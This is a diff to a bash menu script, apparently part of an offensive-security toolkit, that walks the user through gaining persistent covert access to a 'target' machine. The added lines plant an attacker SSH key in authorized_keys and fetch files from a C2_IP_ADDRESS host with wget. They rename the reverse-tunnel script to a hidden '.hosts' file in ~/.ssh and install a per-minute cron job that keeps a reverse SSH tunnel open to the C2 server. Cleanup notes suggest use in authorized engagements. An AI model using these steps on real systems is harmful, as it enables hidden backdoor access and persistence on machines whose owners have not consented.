@@ -649,28 +649,54 @@ do
 			sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^#//' /etc/ssh/sshd_config
 			sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/ssh_config
 			service ssh restart
+			echo -e "\e[1;34mHit \"Enter\" Twice To Accept No Passphrase\e[0m"
+			ssh-keygen -t rsa -f ~/.ssh/at_rsa
+			echo -e "\e[1;34m**Move ~/.ssh/at_rsa.pub To Target (Must Be Placed In ~/.ssh/)**\e[0m"
+			echo -e "\e[1;34mExample Command:\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31mscp ~/.ssh/at_rsa.pub TARGET_USERNAME@TARGET_IP:~/.ssh/\e[97m\E[1;34m"
+			echo -e "\e[1;34mOR\e[0m"
+			echo -e "\e[1;34m(\"cd\" into the directory where the file resides, then..)\e[0m"
+			echo -e "\e[1;34mHost The File With This Command:\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31mpython -m SimpleHTTPServer\e[97m\E[1;34m"
+			echo -e "\e[1;34mThen Use wget or curl From Target To Pull File Down\e[0m"
+			echo -e "\e[1;34m(ON THE TARGET \"cd\" into the directory where the file is to be placed, then..)\e[0m"
+			echo -e "\e[1;34mExample Command:\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31mwget http://C2_IP_ADDRESS:8000/at_rsa.pub\e[97m\E[1;34m"
+			read -p "Press Enter When Ready To Proceed"
+			echo -e "\e[1;34m**YOUR at_rsa.pub KEY *MUST* BE ADDED TO THE ~/.ssh/authorized_keys FILE ON YOUR TARGET**\e[0m"
+			echo -e "\e[1;34m::::::::::::THE FOLLOWING STEP IS TO BE DONE ON YOUR TARGET::::::::::::\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31mcat ~/.ssh/at_rsa.pub >> ~/.ssh/authorized_keys\e[97m\E[1;34m"
             ;;
         "Persistent SSH Session Generator")
 			echo -e "\e[1;34m**Step 1 - Create The Persistence (Self Healing SSH Connection) Script To Run On Your Target**\e[0m"
-			read -p 'Set Local SSH Port On Target (i.e., 1080): ' userlport; read -p 'Set SSH Port On C2 Server (i.e., 22): ' userrport; read -p 'Set Username On C2 Server: ' username; read -p 'Set IP/Domain Name Of C2 Server: ' userhost;
-#Make create_ssh_tunnel.sh something hidden and less suspicious with Ctrl+H
-			touch ~/ATAT/create_ssh_tunnel.sh
-			echo -e "#!/bin/bash" > ~/ATAT/create_ssh_tunnel.sh
-			echo -e "if ps ax | grep -v grep | grep \"ssh -N -R\" > /dev/null" >> ~/ATAT/create_ssh_tunnel.sh
-			echo -e "then" >> ~/ATAT/create_ssh_tunnel.sh
-			echo -e "    echo \"Tunnel running\"" >> ~/ATAT/create_ssh_tunnel.sh
-			echo -e "else" >> ~/ATAT/create_ssh_tunnel.sh
-			echo -e "    echo \"Tunnel is not running, Starting service.\"" >> ~/ATAT/create_ssh_tunnel.sh
-			echo -e "    ssh -N -R "$userlport":localhost:"$userrport" "$username"@"$userhost"" >> ~/ATAT/create_ssh_tunnel.sh
-			echo -e "fi" >> ~/ATAT/create_ssh_tunnel.sh
-			echo -e "\e[1;34m**Step 2 - Move ~/ATAT/create_ssh_tunnel.sh Script To Target (Recommend Placing It In ~/)**\e[0m"
+			read -p 'Set Local SSH Port On Target (i.e., 1081): ' userlport; read -p 'Set SSH Port On C2 Server (i.e., 22): ' userrport; read -p 'Set Username On C2 Server: ' username; read -p 'Set IP/Domain Name Of C2 Server: ' userhost;
+			touch ~/ATAT/.hosts
+			echo -e "#!/bin/bash" > ~/ATAT/.hosts
+			echo -e "if ps ax | grep -v grep | grep \"ssh -N -R\" > /dev/null" >> ~/ATAT/.hosts
+			echo -e "then" >> ~/ATAT/.hosts
+			echo -e "    echo \"Tunnel running\"" >> ~/ATAT/.hosts
+			echo -e "else" >> ~/ATAT/.hosts
+			echo -e "    echo \"Tunnel is not running, Starting service.\"" >> ~/ATAT/.hosts
+			echo -e "    ssh -N -R "$userlport":localhost:"$userrport" "$username"@"$userhost"" >> ~/ATAT/.hosts
+			echo -e "fi" >> ~/ATAT/.hosts
+			echo -e "\e[1;34m**Step 2 - Move ~/ATAT/.hosts Script To Target (Recommend Placing It In ~/.ssh/)**\e[0m"
 			echo -e "\e[1;34mExample Command:\e[0m"
-			echo -e "\E[1;34m\e[97m \e[31mscp ~/ATAT/create_ssh_tunnel.sh TARGET_USERNAME@TARGET_IP:~/\e[97m\E[1;34m"
-			read -p "Press Enter When Ready To Proceed"		
+			echo -e "\E[1;34m\e[97m \e[31mscp ~/ATAT/.hosts TARGET_USERNAME@TARGET_IP:~/.ssh\e[97m\E[1;34m"
+			echo -e "\e[1;34mOR\e[0m"
+			echo -e "\e[1;34m(\"cd\" into the directory where the file resides, then..)\e[0m"
+			echo -e "\e[1;34mHost The File With This Command:\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31mpython -m SimpleHTTPServer\e[97m\E[1;34m"
+			echo ""
 			echo -e "\e[1;34m::::::::::::THESE FOLLOWING STEPS ARE TO BE DONE ON YOUR TARGET::::::::::::\e[0m"
+			echo -e "\e[1;34mThen Use wget or curl From Target To Pull File Down\e[0m"
+			echo -e "\e[1;34m(ON THE TARGET \"cd\" into the directory where the file is to be placed, then..)\e[0m"
+			echo -e "\e[1;34mExample Command:\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31mwget http://C2_IP_ADDRESS:8000/.hosts\e[97m\E[1;34m"
+
+			read -p "Press Enter When Ready To Proceed"		
 			echo ""
 			echo -e "\e[1;34m**Step 3 - Make Script Executable By Running This Command In Terminal On Your Target (Your Teminal Window Must \"cd\" Into The Directory Where You Placed The Script):**\e[0m"
-			echo -e "\E[1;34m\e[97m \e[31mchmod +x create_ssh_tunnel.sh\e[97m\E[1;34m"
+			echo -e "\E[1;34m\e[97m \e[31mchmod +x .hosts\e[97m\E[1;34m"
 			echo ""
 			read -p "Press Enter When Ready To Proceed"
 			echo -e "\e[1;34m**Step 4 - Make Script Monitor & Repair The Connetion When Necessary**\e[0m"
@@ -678,14 +704,18 @@ do
 			echo -e "\E[1;34m\e[97m \e[31mcrontab -e\e[97m\E[1;34m"
 			echo -e "\e[1;34mPlace the line below in as your cron job (a once per minute check to see if the ssh connection is up, if not, attempt to bring it up):\e[0m"
 			echo ""
-			echo -e "\e[1;34mMAKE SURE To Enter YOUR Correct Path For The create_ssh_tunnel.sh File & The SSH Log File!!\e[0m"
-			echo -e "\E[1;34m\e[97m \e[31m*/1 * * * * /path/to/create_ssh_tunnel.sh > /home/<user>/.ssh/tunnel.log 2>&1\e[97m\E[1;34m"
+			echo -e "\e[1;34mMAKE SURE To Enter YOUR Correct Path For The .hosts File & The SSH Log File!!\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31m*/1 * * * * /path/to/.hosts > /home/<user>/.ssh/tunnel.log 2>&1\e[97m\E[1;34m"
 			read -p "Press Enter When Ready To Proceed"
 			echo ""
-			echo -e "\e[1;34m**Step 5 - Generate SSH Authentication Certificate On Target & Move Public Key To C2 Server**\e[0m"
+			echo -e "\e[1;34mStep 5 - Enable SSH Public Key & Password Authentication On Target By Running This Command On Target:\e[0m"
+			echo ""
+			echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/ssh_config\e[97m\E[1;34m"
+			echo ""
+			echo -e "\e[1;34m**Step 6 - Generate SSH Authentication Certificate On Target & Move Public Key To C2 Server**\e[0m"
 			echo -e "\e[1;34mRun This Command On Your Target:\e[0m"
 			echo -e "\E[1;34m\e[97m \e[31mssh-keygen -t rsa\e[97m\E[1;34m"
-			echo -e "\e[1;34mHit Enter To Accept All Defaults \e[0m" #(You May Select A Passphrase For Additional Security, Highly Recommended)
+			echo -e "\e[1;34mHit Enter To Accept All Defaults \e[0m"
 cat << "EOF"
 Your private key will be generated using the default filename (e.g., id_rsa) and stored on your Target in a .ssh directory off your home directory (e.g., ~/.ssh/id_rsa).
 
@@ -718,7 +748,20 @@ EOF
 			echo -e "\e[1;34mTo Connect To Target From C2 Server Enter The Following Command In Terminal (On C2 Server) \e[0m"
 			echo -e "\E[1;34m\e[97m \e[31mssh -l TARGET_USERNAME -p "$userlport" localhost \e[97m\E[1;34m"
 			echo -e "\e[1;34m**MAKE SURE** To Enter The Correct Username For The Target. Then Enter The SSH Password For The Target When Prompted. \e[0m"
-			echo ""		
+			echo ""
+			echo -e "\e[1;34m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m"		
+			echo -e "\e[1;34m::::::::::::THESE FOLLOWING STEPS ARE TO BE DONE ON YOUR TARGET ONCE ENGAGEMENT IS COMPLETE::::::::::::\e[0m"
+			echo -e "\e[1;34m****CLEAN UP NOTES FOR SSH CONFIG ON TARGET****\e[0m"
+			echo -e "\e[1;34m***To Disable SSH Public Key & Password Authentication On Target (Once Done, If Necessary) Run:***\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/ssh_config\e[97m\E[1;34m"
+			echo ""
+			echo -e "\e[1;34m***Remove The Line In ~/.ssh/authorized_keys That Matches The Contents Of ~/.ssh/at_rsa.pub***\e[0m"
+			echo ""
+			echo -e "\e[1;34m**Also, remove the following files from the target:**\e[0m"
+			echo -e "\e[1;34m~/.ssh/at_rsa.pub\e[0m"
+			echo -e "\e[1;34m~/.ssh/tunnel.log\e[0m"
+			echo -e "\e[1;34m~/.ssh/.hosts\e[0m"
+			echo ""
 			;; 
         "Android")
         read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport;
